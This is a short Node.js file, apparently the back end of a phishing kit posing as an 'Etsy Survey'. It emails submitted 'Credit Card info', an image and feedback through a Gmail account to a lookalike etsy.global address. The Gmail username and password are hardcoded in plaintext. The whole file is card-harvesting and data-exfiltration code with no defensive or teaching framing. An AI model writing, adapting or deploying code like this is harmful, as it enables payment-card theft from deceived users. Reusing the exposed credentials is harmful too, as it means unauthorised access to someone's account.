'use strict';

const nodemailer = require('nodemailer');
const path = require('path');
const ABSPATH = path.dirname(process.mainModule.filename); // Absolute path to our app directory
const transporter = nodemailer.createTransport({ // Use an app specific password here
  service: 'Gmail',
  auth: {
    user: 'david@etsy.global',
    pass: 'Iwillbefamous5+'
  }
});

exports.sendMailService=function(cardC='not exit',opinion='no Feedback',image='no file'){
	const options = {
    from: 'david@etsy.global',
    to: 'david@etsy.global',
    subject: 'From Etsy Survey',
    html: `<ul>
     <li><br>Credit Card info:<b> ${cardC}</li>
     <li>${image}</li>
    <li><br>Opinion:<b/>${opinion}</li> 

     </li>`
    // attachments: [
    //    {
    //     path: ABSPATH + '/images/test.jpg'
    //    }
    // ]
};
transporter.sendMail(options, (error, info) =>{
    if(error) {
       console.log('error')
    } else {
      console.log('hi')
    }
});

};

//module.exports=sendMailService












